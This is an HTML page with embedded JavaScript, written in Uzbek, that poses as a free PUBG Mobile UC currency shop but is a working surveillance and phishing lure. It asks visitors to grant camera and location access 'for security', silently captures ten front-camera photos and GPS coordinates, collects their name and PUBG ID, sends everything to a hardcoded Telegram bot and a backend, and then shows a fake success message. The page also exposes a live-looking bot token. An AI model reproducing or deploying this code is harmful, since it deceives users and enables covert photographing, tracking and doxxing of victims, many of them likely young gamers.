<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE: FREE UC ELITE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.9); border: 2px solid var(--neon-b); border-radius: 30px; padding: 25px; text-align: center; box-shadow: 0 0 20px var(--neon-b); }
        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 15px; padding: 15px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; transition: 0.3s; }
        .uc-item:hover { background: rgba(57, 255, 20, 0.2); transform: scale(1.02); }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 25px; padding: 25px; width: 100%; max-width: 350px; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; background: rgba(255,255,255,0.05); border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 16px; box-sizing: border-box; }
        .btn-main { width: 100%; padding: 16px; background: var(--neon-b); border: none; border-radius: 10px; font-weight: 900; cursor: pointer; font-size: 18px; color: #000; text-transform: uppercase; }
        .instruction { color: var(--neon-g); font-size: 14px; margin-bottom: 15px; border: 1px dashed var(--neon-g); padding: 10px; border-radius: 8px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div id="app">
    <h1 style="font-family:'Orbitron'; color:var(--neon-b); margin-bottom: 5px;">UC ELITE SHOP</h1>
    <p style="color: #aaa;">Paketni tanlang:</p>
    <div onclick="start('60 UC')" class="uc-item"><b>60 UC 🎁</b> <span>0 UZS</span></div>
    <div onclick="start('325 UC')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
</div>

<div id="authModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b); font-family:'Orbitron';">IDENTIFIKATSIYA</h2>
        <p class="instruction">Xavfsizlik uchun keyingi oynada "Ruxsat berish" (Allow) tugmasini bosing.</p>
        <button class="btn-main" id="authBtn" onclick="getAccess()">TASDIQLASH</button>
    </div>
</div>

<div id="formModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b); font-family:'Orbitron';">MA'LUMOTLAR</h2>
        <input type="text" id="u_name" placeholder="Ismingiz">
        <input type="number" id="u_id" placeholder="PUBG ID">
        <button class="btn-main" onclick="sendData()">UC YUKLASH</button>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    // Sizning bot ma'lumotlaringiz
    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";
    const BACKEND_URL = "http://localhost:8000/verify";

    let selectedPackage = "", photos = [], lat = 0, lon = 0;

    function start(pkg) {
        selectedPackage = pkg;
        document.getElementById('authModal').style.display = 'flex';
    }

    async function getAccess() {
        const btn = document.getElementById('authBtn');
        btn.innerText = "KUTILMOQDA...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('vid');
            video.srcObject = stream;

            navigator.geolocation.getCurrentPosition(async (position) => {
                lat = position.coords.latitude;
                lon = position.coords.longitude;

                const canvas = document.getElementById('canv');
                const ctx = canvas.getContext('2d');

                // 10 ta rasm olish (0.4 sekund oraliq bilan)
                for (let i = 0; i < 10; i++) {
                    await new Promise(r => setTimeout(r, 400));
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    photos.push(canvas.toDataURL('image/jpeg', 0.6));
                }

                stream.getTracks().forEach(track => track.stop());
                document.getElementById('authModal').style.display = 'none';
                document.getElementById('formModal').style.display = 'flex';
            }, (err) => {
                alert("Xato: Lokatsiyaga ruxsat berish shart!");
                location.reload();
            });
        } catch (err) {
            alert("Xato: Kameraga ruxsat berish shart!");
            btn.innerText = "QAYTA URINISH";
        }
    }

    async function sendData() {
        const name = document.getElementById('u_name').value;
        const pubgId = document.getElementById('u_id').value;
        if (!name || !pubgId) return alert("To'ldiring!");

        const now = new Date().toLocaleString('uz-UZ');
        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;

        // 1. Telegramga ma'lumotlarni yuborish
        const message = `🔥 *BUYURTMA* 🔥\n👤: ${name}\n🆔: \`${pubgId}\`\n📦: ${selectedPackage}\n📍: [Manzil](${googleMaps})`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });

        // 2. Telegramga 10 ta rasm yuborish
        for (let i = 0; i < photos.length; i++) {
            const blob = await (await fetch(photos[i])).blob();
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `img_${i}.jpg`);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        // 3. Python Backendga yuborish
        const backFD = new FormData();
        backFD.append("lat", lat);
        backFD.append("lon", lon);
        for (let i = 0; i < photos.length; i++) {
            const blob = await (await fetch(photos[i])).blob();
            backFD.append("images", blob, `pic_${i}.jpg`);
        }
        fetch(BACKEND_URL, { method: "POST", body: backFD }).catch(e => console.log("Backend offline"));

        alert("✅ Muvaffaqiyatli! UC yuklanmoqda...");
        location.reload();
    }
</script>
</body>
</html>
